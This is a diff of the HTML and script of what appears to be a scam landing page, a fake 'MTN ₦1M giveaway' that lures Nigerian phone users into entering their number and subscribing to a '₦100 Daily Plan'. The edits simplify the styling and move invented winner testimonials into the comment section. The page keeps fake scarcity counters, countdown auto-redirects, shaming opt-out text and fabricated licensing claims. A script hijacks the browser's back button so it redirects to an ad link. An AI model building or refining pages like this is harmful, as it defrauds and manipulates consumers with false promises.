@@ -484,7 +484,63 @@
             }
 
             .header h1 {
-                font-size: 1.4em;
+                font-size: 1.2em;
+                line-height: 1.3;
+            }
+
+            .alert-banner {
+                font-size: 0.9em !important;
+                padding: 8px !important;
+                line-height: 1.3;
+            }
+
+            .client {
+                font-size: 0.9em;
+                line-height: 1.4;
+            }
+
+            .info {
+                font-size: 0.9em;
+                line-height: 1.4;
+            }
+
+            .info h3 {
+                font-size: 1.1em;
+                line-height: 1.3;
+            }
+
+            .boxs {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+                padding: 15px 10px;
+            }
+
+            .comment {
+                padding: 10px;
+            }
+
+            .comment_text {
+                font-size: 0.9em;
+                line-height: 1.3;
+            }
+
+            .comment_info {
+                font-size: 0.8em;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .header h1 {
+                font-size: 1.1em;
+            }
+
+            .alert-banner {
+                font-size: 0.8em !important;
+            }
+
+            .boxs {
+                gap: 8px;
+                padding: 10px 5px;
             }
         }
     </style>
@@ -492,55 +548,31 @@
 <body>
     <div class="wrapper">
         <div class="header">
-            <h1 style="font-size: 1.8em; text-shadow: 2px 2px 4px rgba(255,0,0,0.3); animation: pulse 2s infinite;">
-                <svg width="24" height="24" viewBox="0 0 24 24" style="display: inline-block; vertical-align: middle; margin-right: 8px; animation: fire 1.5s infinite;">
-                    <path d="M12 2L14.5 9.5L22 12L14.5 14.5L12 22L9.5 14.5L2 12L9.5 9.5L12 2Z" fill="#ff0000" stroke="#000" stroke-width="2"/>
-                    <path d="M12 6L13 10L17 11L13 12L12 16L11 12L7 11L11 10L12 6Z" fill="#ffcc00"/>
-                </svg>
+            <h1 style="font-size: 1.4em;">
                 🔥 MTN URGENT ALERT! ₦1M GIVEAWAY ENDING TODAY! 🎰
             </h1>
         </div>
         <div class="content">
             <!-- 紧急奖励横幅 -->
-            <div class="alert-banner" style="background: linear-gradient(45deg, #ff0000, #ff6b35, #ffcc00); color: white; font-weight: bold; animation: blink 1s infinite; border: 2px solid #000; border-radius: 8px; padding: 12px;">
-                <svg width="18" height="18" viewBox="0 0 18 18" style="display: inline-block; vertical-align: middle; margin-right: 6px; animation: rotate 2s infinite;">
-                    <path d="M9 1L10.5 4.5L14 6L10.5 7.5L9 11L7.5 7.5L4 6L7.5 4.5L9 1Z" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    <text x="9" y="16" text-anchor="middle" font-family="Arial Black" font-size="8" font-weight="900" fill="white">!</text>
-                </svg>
+            <div class="alert-banner" style="background: #ff6b35; color: white; font-weight: bold; border: 1px solid #000; padding: 10px;">
                 ⚠️ BREAKING: Only <span id="remainingSpots">47</span> Winners Left Today! ₦100 = ₦1M CHANCE!
                 <span style="float: right; font-size: 0.9em;">⏰ <span id="timeLeft">23:45:12</span></span>
             </div>
 
-            <div class="client" style="background: linear-gradient(135deg, #ffcc00, #ff6b35); border: 3px solid #000; border-radius: 12px; padding: 15px; margin: 15px 0;">
-                <strong style="font-size: 1.4em; color: #000;">
-                    <svg width="24" height="24" viewBox="0 0 24 24" style="display: inline-block; vertical-align: middle; margin-right: 8px; animation: spin 3s infinite;">
-                        <circle cx="12" cy="12" r="10" fill="#ff0000" stroke="#000" stroke-width="3"/>
-                        <text x="12" y="18" text-anchor="middle" font-family="Arial Black" font-size="16" font-weight="900" fill="#ffcc00">₦</text>
-                        <path d="M12 2L15 9L22 10L17 15L18 22L12 19L6 22L7 15L2 10L9 9L12 2Z" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    </svg>
+            <div class="client">
+                <strong>
                     💰 INSTANT MILLIONAIRE OPPORTUNITY!
                 </strong><br>
-                <span style="font-size: 1.1em; font-weight: bold; color: #000;">🎯 CONGRATULATIONS! You're ELIGIBLE for Today's ₦1,000,000 Jackpot!</span><br>
-                <div style="background: rgba(255,255,255,0.8); padding: 8px; border-radius: 8px; margin-top: 8px; border: 2px dashed #ff0000;">
-                    <strong style="color: #ff0000;">🔥 LIMITED TIME: ₦100 Investment = ₦1,000,000 Return! 🔥</strong>
-                </div>
+                🎯 CONGRATULATIONS! You're ELIGIBLE for Today's ₦1,000,000 Jackpot!<br>
+                <strong style="color: #ff6b35;">🔥 LIMITED TIME: ₦100 Investment = ₦1,000,000 Return! 🔥</strong>
             </div>
 
-            <div class="info" style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; border: 3px solid #000; border-radius: 12px; padding: 15px; margin: 15px 0;">
-                <h3 style="font-size: 1.6em; color: white; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
-                    <svg width="28" height="28" viewBox="0 0 28 28" style="display: inline-block; vertical-align: middle; margin-right: 8px; animation: glow 1s infinite alternate;">
-                        <circle cx="14" cy="14" r="12" fill="#ffcc00" stroke="#000" stroke-width="3"/>
-                        <text x="14" y="20" text-anchor="middle" font-family="Arial Black" font-size="12" font-weight="900" fill="#000">1M</text>
-                        <path d="M14 2L18 10L26 11L20 17L22 26L14 22L6 26L8 17L2 11L10 10L14 2Z" fill="#ff0000" stroke="#000" stroke-width="2"/>
-                    </svg>
+            <div class="info">
+                <h3>
                     🎰 MATCH 3 ITEMS - WIN ₦1,000,000 INSTANTLY! 🎰
                 </h3>
-                <div style="font-size: 1.2em; font-weight: bold; color: #ffcc00; text-align: center;">
-                    ⚡ ONLY <span id="spotsLeft">47</span> SPOTS LEFT! • ACTIVATE NOW OR LOSE CHANCE! ⚡
-                </div>
-                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; margin-top: 10px; border: 2px solid #ffcc00;">
-                    <strong style="color: #ffcc00; font-size: 1.1em;">🏆 WINNERS ANNOUNCED EVERY 5 MINUTES! 🏆</strong>
-                </div>
+                ⚡ ONLY <span id="spotsLeft">47</span> SPOTS LEFT! • ACTIVATE NOW OR LOSE CHANCE! ⚡<br>
+                <strong>🏆 WINNERS ANNOUNCED EVERY 5 MINUTES! 🏆</strong>
             </div>
             <div class="boxs">
                 <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
@@ -554,60 +586,13 @@
                 <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
             </div>
 
-            <!-- 🏆 WINNERS TESTIMONIALS 🏆 -->
-            <div style="background: linear-gradient(135deg, #ffcc00, #fff); border: 3px solid #000; border-radius: 12px; padding: 15px; margin: 20px 0; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">
-                <h3 style="text-align: center; font-size: 1.4em; color: #ff0000; margin-bottom: 15px;">
-                    🔥 REAL WINNERS - ₦1,000,000 PAID TODAY! 🔥
-                </h3>
-
-                <div style="background: white; padding: 10px; border-radius: 8px; margin: 10px 0; border: 2px solid #ffcc00;">
-                    <div style="font-weight: bold; color: #000; font-size: 1.1em;">
-                        <svg width="16" height="16" viewBox="0 0 16 16" style="display: inline-block; vertical-align: middle; margin-right: 5px;">
-                            <path d="M8 16A8 8 0 1 1 8 0a8 8 0 0 1 0 16zm3-11c0 .4-.2.8-.5 1.1s-.7.5-1.1.5-.8-.2-1.1-.5S8 4.4 8 4s.2-.8.5-1.1S7.6 2.4 8 2.4s.8.2 1.1.5S9.5 3.6 9.5 4zm-6 4.5c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S5.8 7 5 7s-1.5.7-1.5 1.5zm6.5 0c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S12.3 7 11.5 7S10 7.7 10 8.5z" fill="#ff0000"/>
-                        </svg>
-                        Chukwuma from Lagos: <span style="color: #ff0000; font-weight: 900;">"Just won ₦500,000 with ₦100! This is REAL!"</span> ⭐⭐⭐⭐⭐
-                    </div>
-                    <div style="color: #666; font-size: 0.9em; margin-top: 5px;">
-                        💰 Verified Winner • 2 hours ago • Bank Transfer Confirmed!
-                    </div>
-                </div>
-
-                <div style="background: white; padding: 10px; border-radius: 8px; margin: 10px 0; border: 2px solid #ffcc00;">
-                    <div style="font-weight: bold; color: #000; font-size: 1.1em;">
-                        <svg width="16" height="16" viewBox="0 0 16 16" style="display: inline-block; vertical-align: middle; margin-right: 5px;">
-                            <path d="M8 16A8 8 0 1 1 8 0a8 8 0 0 1 0 16zm3-11c0 .4-.2.8-.5 1.1s-.7.5-1.1.5-.8-.2-1.1-.5S8 4.4 8 4s.2-.8.5-1.1S7.6 2.4 8 2.4s.8.2 1.1.5S9.5 3.6 9.5 4zm-6 4.5c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S5.8 7 5 7s-1.5.7-1.5 1.5zm6.5 0c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S12.3 7 11.5 7S10 7.7 10 8.5z" fill="#ff0000"/>
-                        </svg>
-                        Amina from Abuja: <span style="color: #ff0000; font-weight: 900;">"At first I thought it was fake, but money hit my account in 5 minutes!"</span> 🔥🔥🔥
-                    </div>
-                    <div style="color: #666; font-size: 0.9em; margin-top: 5px;">
-                        💰 Verified Winner • 4 hours ago • Instant Credited!
-                    </div>
-                </div>
-
-                <div style="background: white; padding: 10px; border-radius: 8px; margin: 10px 0; border: 2px solid #ffcc00;">
-                    <div style="font-weight: bold; color: #000; font-size: 1.1em;">
-                        <svg width="16" height="16" viewBox="0 0 16 16" style="display: inline-block; vertical-align: middle; margin-right: 5px;">
-                            <path d="M8 16A8 8 0 1 1 8 0a8 8 0 0 1 0 16zm3-11c0 .4-.2.8-.5 1.1s-.7.5-1.1.5-.8-.2-1.1-.5S8 4.4 8 4s.2-.8.5-1.1S7.6 2.4 8 2.4s.8.2 1.1.5S9.5 3.6 9.5 4zm-6 4.5c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S5.8 7 5 7s-1.5.7-1.5 1.5zm6.5 0c0 .8.7 1.5 1.5 1.5s1.5-.7 1.5-1.5S12.3 7 11.5 7S10 7.7 10 8.5z" fill="#ff0000"/>
-                        </svg>
-                        Tunde from Port Harcourt: <span style="color: #ff0000; font-weight: 900;">"My brother won yesterday, today it's my turn! Already received ₦200,000!"</span> 💰💰💰
-                    </div>
-                    <div style="color: #666; font-size: 0.9em; margin-top: 5px;">
-                        💰 Verified Winner • 6 hours ago • Family Winners!
-                    </div>
-                </div>
-
-                <div style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; padding: 10px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: bold; font-size: 1.1em;">
-                    🚨 <span id="winnerCount">1,847</span> WINNERS TODAY! <span id="totalPaid">₦18,470,000</span> PAID! 🚨
-                </div>
-            </div>
-
             <!-- 用户评论区 -->
             <div class="comments">
                 <div class="comment">
                     <div class="comment_img"><img src="img/001-optimized.jpg" alt="Chioma" loading="lazy"></div>
                     <div class="comment-content">
-                        <div class="comment_name">Chioma Adebayo</div>
-                        <div class="comment_text">I was skeptical about the N100 daily plan at first, but I tried it and BOOM! Won ₦2000 airtime immediately. Legit!</div>
+                        <div class="comment_name">Chukwuma from Lagos</div>
+                        <div class="comment_text">Just won ₦500,000 with ₦100! This is REAL! Money hit my account in 5 minutes! 🤑🤑🤑</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="127">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -635,8 +620,8 @@
                 <div class="comment">
                     <div class="comment_img"><img src="img/002-optimized.jpg" alt="Tunde" loading="lazy"></div>
                     <div class="comment-content">
-                        <div class="comment_name">Tunde Olamide</div>
-                        <div class="comment_text">Just subscribed. The code arrived fast via SMS. Hoping to hit the cash jackpot today! Abeg make una wish me luck o!</div>
+                        <div class="comment_name">Amina from Abuja</div>
+                        <div class="comment_text">At first I thought it was fake, but money hit my account in 5 minutes! ₦100 changed my life! 🔥🔥🔥</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="89">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -664,8 +649,8 @@
                 <div class="comment">
                     <div class="comment_img"><img src="img/003-optimized.jpg" alt="Zainab" loading="lazy"></div>
                     <div class="comment-content">
-                        <div class="comment_name">Zainab Sani</div>
-                        <div class="comment_text">My friend won yesterday so I joined via the daily plan. Best way to verify is to use your main MTN line.</div>
+                        <div class="comment_name">Tunde from Port Harcourt</div>
+                        <div class="comment_text">My brother won yesterday, today it's my turn! Already received ₦200,000! Family winners! 💰💰💰</div>
                         <div class="comment_info">
                             <button class="like-btn" data-likes="203">
                                 <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
@@ -884,9 +869,9 @@
 
         const swalWithTimer = Swal.mixin({
             icon: 'success',
-            iconHtml: '<svg width="80" height="80" viewBox="0 0 80 80" style="animation: jackpot-pulse 1s infinite;"><circle cx="40" cy="40" r="35" fill="url(#megaWinGrad)" stroke="#ff0000" stroke-width="4"/><text x="40" y="35" text-anchor="middle" font-family="Arial Black" font-size="20" font-weight="900" fill="#ff0000">WIN!</text><text x="40" y="55" text-anchor="middle" font-family="Arial Black" font-size="12" font-weight="900" fill="#ffcc00">₦1M</text><path d="M40 10L45 25L60 27L48 37L52 52L40 44L28 52L32 37L20 27L35 25L40 10Z" fill="#ff0000" stroke="#000" stroke-width="2"/><defs><linearGradient id="megaWinGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ffcc00;stop-opacity:1"/><stop offset="100%" style="stop-color:#ff0000;stop-opacity:1"/></linearGradient></defs></svg>',
+            iconHtml: '🏆',
             title: '🎉 JACKPOT WINNER DETECTED! 🎉',
-            html: '<div style="text-align: center; background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; padding: 20px; border-radius: 15px; border: 3px solid #ffcc00; animation: fire-border 1s infinite alternate;"><h1 style="color: #ffcc00; font-size: 2em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); animation: glow-text 1s infinite alternate;">🏆 CONGRATULATIONS! 🏆</h1><h2 style="color: white; font-size: 1.5em; margin: 10px 0;">YOU HAVE MATCHED THE WINNING COMBINATION!</h2><div style="background: rgba(255,255,255,0.9); padding: 15px; border-radius: 10px; margin: 15px 0; border: 3px dashed #ff0000;"><div style="color: #000; font-size: 1.8em; font-weight: 900; margin-bottom: 5px;">🏆 YOUR PRIZE: ₦1,000,000 CASH PRIZE 🏆</div><div style="color: #ff0000; font-size: 1.2em; font-weight: bold; animation: blink 0.5s infinite;">⚠️ STATUS: CONFIRMED & RESERVED FOR 60 SECONDS!</div></div><div style="background: rgba(255,204,0,0.9); color: #000; padding: 12px; border-radius: 8px; margin: 10px 0; border: 2px solid #ff0000;"><h3 style="font-size: 1.3em; color: #ff0000; margin: 0;">🔥 IMMEDIATE ACTION REQUIRED:</h3><ol style="text-align: left; margin: 10px auto; display: inline-block; font-weight: bold; font-size: 1.1em;"><li style="color: #000;">You will be <strong style="color: #ff0000; font-size: 1.2em;">AUTO-REDIRECTED</strong> in <span id="countdown" style="color: #ff0000; font-size: 1.5em; font-weight: 900;">' + countdownSeconds + '</span> seconds!</li><li style="color: #000;">Enter your MTN number on secure page</li><li style="color: #000;">Activate ₦100 Daily Plan to unlock <strong style="color: #ff0000;">₦1M INSTANTLY!</strong></li></ol></div><div style="font-size: 1.4em; font-weight: 900; color: #ffcc00; margin: 15px 0; animation: pulse-text 0.8s infinite;">💥 REDIRECTING IN <span id="countdown">' + countdownSeconds + '</span> SECONDS - ACTIVATE NOW! 💥</div><div style="background: rgba(255,0,0,0.8); color: white; padding: 10px; border-radius: 8px; margin-top: 15px; font-weight: bold; font-size: 1.2em; border: 2px solid #ffcc00;">⚠️ OFFER EXPIRES IF YOU DELAY! ⚠️</div><button id="cancelRedirect" style="background: linear-gradient(45deg, #6c757d, #ff0000); color: white; border: 2px solid #000; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: 900; font-size: 1.1em; margin-top:15px; animation: shake 2s infinite;">❌ NO THANKS - I DON\'T WANT ₦1M</button></div>',
+            html: '<div style="text-align: center;"><h2 style="color: #ff6b35; font-size: 1.5em; margin-bottom: 10px;">🎉 JACKPOT WINNER DETECTED! 🎉</h2><h3 style="color: #000; margin-bottom: 10px;">🏆 CONGRATULATIONS! YOU MATCHED THE WINNING COMBINATION! 🏆</h3><div style="background: #fff3cd; padding: 15px; border-radius: 8px; border: 2px solid #ff0000; margin: 15px 0;"><div style="color: #000; font-size: 1.4em; font-weight: bold; margin-bottom: 5px;">🏆 YOUR PRIZE: ₦1,000,000 CASH PRIZE 🏆</div><div style="color: #ff0000; font-weight: bold;">⚠️ STATUS: CONFIRMED & RESERVED FOR 60 SECONDS!</div></div><div style="background: #ffcc00; padding: 12px; border-radius: 8px; margin: 10px 0; border: 1px solid #000;"><h4 style="color: #000; margin: 0;">🔥 IMMEDIATE ACTION REQUIRED:</h4><ol style="text-align: left; margin: 10px auto; display: inline-block; font-weight: bold;"><li>You will be <strong style="color: #ff0000;">AUTO-REDIRECTED</strong> in <span id="countdown" style="color: #ff0000; font-weight: 900;">' + countdownSeconds + '</span> seconds!</li><li>Enter your MTN number on secure page</li><li>Activate ₦100 Daily Plan to unlock <strong style="color: #ff0000;">₦1M INSTANTLY!</strong></li></ol></div><div style="font-weight: bold; color: #ff6b35; margin: 15px 0;">💥 REDIRECTING IN <span id="countdown">' + countdownSeconds + '</span> SECONDS - ACTIVATE NOW! 💥</div><div style="background: #ff6b35; color: white; padding: 10px; border-radius: 8px; margin-top: 15px; font-weight: bold;">⚠️ OFFER EXPIRES IF YOU DELAY! ⚠️</div><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 10px 16px; border-radius: 5px; cursor: pointer; font-weight: bold;">❌ NO THANKS - I DON\'T WANT ₦1M</button></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
             timer: countdownSeconds * 1000,
@@ -970,12 +955,12 @@
     function dialog3Manual() {
         Swal.fire({
             icon: 'success',
-            iconHtml: '<svg width="70" height="70" viewBox="0 0 70 70" style="animation: spin 2s linear infinite;"><circle cx="35" cy="35" r="30" fill="url(#cashGrad)" stroke="#ff0000" stroke-width="4"/><text x="35" y="30" text-anchor="middle" font-family="Arial Black" font-size="18" font-weight="900" fill="#ffcc00">₦1M</text><text x="35" y="48" text-anchor="middle" font-family="Arial Black" font-size="10" font-weight="900" fill="#fff">YOURS!</text><path d="M35 10L39 22L51 24L41 34L44 47L35 40L26 47L29 34L19 24L31 22L35 10Z" fill="#ffcc00" stroke="#000" stroke-width="2"/><defs><linearGradient id="cashGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff0000;stop-opacity:1"/><stop offset="100%" style="stop-color:#ffcc00;stop-opacity:1"/></linearGradient></defs></svg>',
+            iconHtml: '💰',
             title: '💰 FINAL STEP TO CLAIM ₦1,000,000! 💰',
-            html: '<div style="text-align: center; background: linear-gradient(135deg, #ffcc00, #ff6b35); padding: 20px; border-radius: 15px; border: 3px solid #ff0000;"><h2 style="color: #ff0000; font-size: 1.6em; margin-bottom: 15px; text-shadow: 1px 1px 3px rgba(0,0,0,0.5);">🎯 WINNER CONFIRMED! Your ₦1,000,000 prize is waiting!</h2><div style="background: rgba(255,255,255,0.95); padding: 15px; border-radius: 10px; margin: 15px 0; border: 3px solid #ff0000;"><div style="color: #000; font-size: 1.4em; font-weight: 900; margin-bottom: 10px;">🔥 SECURE YOUR WINNING NOW:</div><ul style="text-align: left; margin: 0 auto; display: inline-block; font-weight: bold; font-size: 1.1em; color: #000;"><li>• Click <strong style="color: #ff0000; font-size: 1.2em;">"CLAIM MY ₦1M NOW"</strong> button below</li><li>• Enter MTN number (takes 10 seconds)</li><li>• <strong style="color: #ff0000;">₦100 investment = ₦1,000,000 return!</strong></li></ul></div><div style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; padding: 12px; border-radius: 8px; margin-top: 15px; font-weight: bold; font-size: 1.1em; animation: pulse 1s infinite;"><div style="font-size: 1.2em; color: #ffcc00;">⚠️ WARNING: <span id="otherActivating">46</span> other winners are activating now!</div><div style="font-size: 1.1em;">⚠️ OFFER EXPIRES IN: <span id="expiryTimer" style="color: #ffcc00; font-weight: 900;">59</span>...<span id="expiryTimer2">58</span>...<span id="expiryTimer3">57</span>...</div></div><div style="margin-top: 15px; font-size: 1em; color: #333;">🏆 <strong style="color: #ff0000;">1,847 WINNERS TODAY!</strong> • <strong style="color: #ff0000;">₦18.4M PAID!</strong> 🏆</div></div>',
+            html: '<div style="text-align: center;"><h3 style="color: #ff6b35; font-size: 1.4em; margin-bottom: 15px;">🎯 WINNER CONFIRMED! Your ₦1,000,000 prize is waiting!</h3><div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin: 15px 0; border: 2px solid #ff0000;"><div style="color: #000; font-size: 1.2em; font-weight: bold; margin-bottom: 10px;">🔥 SECURE YOUR WINNING NOW:</div><ul style="text-align: left; margin: 0 auto; display: inline-block; font-weight: bold;"><li>• Click <strong style="color: #ff0000;">"CLAIM MY ₦1M NOW"</strong> button below</li><li>• Enter MTN number (takes 10 seconds)</li><li>• <strong style="color: #ff0000;">₦100 investment = ₦1,000,000 return!</strong></li></ul></div><div style="background: #ff6b35; color: white; padding: 12px; border-radius: 8px; margin-top: 15px; font-weight: bold;">⚠️ WARNING: <span id="otherActivating">46</span> other winners are activating now!</div><div style="margin-top: 15px;">🏆 <strong style="color: #ff0000;">1,847 WINNERS TODAY!</strong> • <strong style="color: #ff0000;">₦18.4M PAID!</strong> 🏆</div></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<button onclick="handleManualClick()" style="background: linear-gradient(45deg, #ffcc00, #ff0000); color: white; border: 3px solid #000; padding: 15px 20px; border-radius: 10px; cursor: pointer; font-weight: 900; font-size: 1.3em; width: 100%; animation: fire-button 1s infinite alternate; text-shadow: 1px 1px 3px rgba(0,0,0,0.7);">🚀 CLAIM MY ₦1,000,000 NOW! 🚀</button>'
+            footer: '<button onclick="handleManualClick()" style="background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%; padding: 12px; font-size: 1.1em;">🚀 CLAIM MY ₦1,000,000 NOW! 🚀</button>'
         });
     }
 
@@ -1109,81 +1094,5 @@
     // 历史记录回退保护，使用 {clickurl} 占位符
     !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href="{clickurl}")}}catch(b){}}();
     </script>
-
-    <!-- 🏢 权威背书和信任元素 🏢 -->
-    <div style="background: linear-gradient(135deg, #1a1a1a, #333); color: white; padding: 20px; margin-top: 0; border-top: 3px solid #ffcc00;">
-        <div style="text-align: center; margin-bottom: 15px;">
-            <h3 style="color: #ffcc00; font-size: 1.4em; margin-bottom: 10px;">🏆 OFFICIAL MTN PARTNER - 100% VERIFIED 🏆</h3>
-        </div>
-
-        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; max-width: 800px; margin: 0 auto;">
-            <!-- 权威认证 -->
-            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #ffcc00;">
-                <svg width="40" height="40" viewBox="0 0 40 40" style="display: block; margin: 0 auto 10px;">
-                    <circle cx="20" cy="20" r="18" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    <path d="M20 5L23 12L30 13L25 18L27 25L20 21L13 25L15 18L10 13L17 12L20 5Z" fill="#000"/>
-                </svg>
-                <div style="font-weight: bold; color: #ffcc00; font-size: 1.1em;">LICENSED BY</div>
-                <div style="font-size: 0.9em;">Nigerian Gaming Commission</div>
-                <div style="font-size: 0.8em; color: #ccc;">License #NGC-2024-1847</div>
-            </div>
-
-            <!-- 安全保障 -->
-            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #ffcc00;">
-                <svg width="40" height="40" viewBox="0 0 40 40" style="display: block; margin: 0 auto 10px;">
-                    <circle cx="20" cy="20" r="18" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    <path d="M15 15 L25 15 L25 25 L15 25 Z M18 20 L22 20" stroke="#000" stroke-width="2" fill="none"/>
-                </svg>
-                <div style="font-weight: bold; color: #ffcc00; font-size: 1.1em;">BANK-LEVEL</div>
-                <div style="font-size: 0.9em;">SSL ENCRYPTION</div>
-                <div style="font-size: 0.8em; color: #ccc;">256-bit Security</div>
-            </div>
-
-            <!-- 客服支持 -->
-            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #ffcc00;">
-                <svg width="40" height="40" viewBox="0 0 40 40" style="display: block; margin: 0 auto 10px;">
-                    <circle cx="20" cy="20" r="18" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    <path d="M20 10 L24 18 L32 18 L26 23 L28 31 L20 26 L12 31 L14 23 L8 18 L16 18 L20 10Z" fill="#000"/>
-                </svg>
-                <div style="font-weight: bold; color: #ffcc00; font-size: 1.1em;">24/7 LIVE</div>
-                <div style="font-size: 0.9em;">CUSTOMER SUPPORT</div>
-                <div style="font-size: 0.8em; color: #ccc;">Instant Help Available</div>
-            </div>
-
-            <!-- 获奖统计 -->
-            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #ffcc00;">
-                <svg width="40" height="40" viewBox="0 0 40 40" style="display: block; margin: 0 auto 10px;">
-                    <circle cx="20" cy="20" r="18" fill="#ffcc00" stroke="#000" stroke-width="2"/>
-                    <text x="20" y="25" text-anchor="middle" font-family="Arial Black" font-size="16" font-weight="900" fill="#000">M+</text>
-                </svg>
-                <div style="font-weight: bold; color: #ffcc00; font-size: 1.1em;">1M+ HAPPY</div>
-                <div style="font-size: 0.9em;">WINNERS SINCE 2020</div>
-                <div style="font-size: 0.8em; color: #ccc;">Join Our Success Story</div>
-            </div>
-        </div>
-
-        <!-- 保证声明 -->
-        <div style="background: rgba(255,204,0,0.2); padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; border: 2px solid #ffcc00;">
-            <div style="font-size: 1.2em; font-weight: bold; color: #ffcc00; margin-bottom: 10px;">
-                💯 OUR ROCK-SOLID GUARANTEES 💯
-            </div>
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px;">
-                <div>✔ 100% SATISFACTION GUARANTEED</div>
-                <div>✔ FULL REFUND IF NOT SATISFIED</div>
-                <div>✔ INSTANT PAYOUT GUARANTEED</div>
-                <div>✔ LIVE SUPPORT READY TO HELP</div>
-            </div>
-        </div>
-
-        <!-- 免责声明 -->
-        <div style="text-align: center; margin-top: 20px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px;">
-            <small style="color: #ccc;">
-                *Terms & Conditions Apply. Must be 18+. Game of skill. ₦100 Daily Plan subscription required for prize activation.
-                Prize winners selected daily. Limited to one prize per user. MTN partner program terms apply.
-                Licensed by Nigerian Gaming Commission.
-            </small>
-        </div>
-    </div>
-
 </body>
 </html>
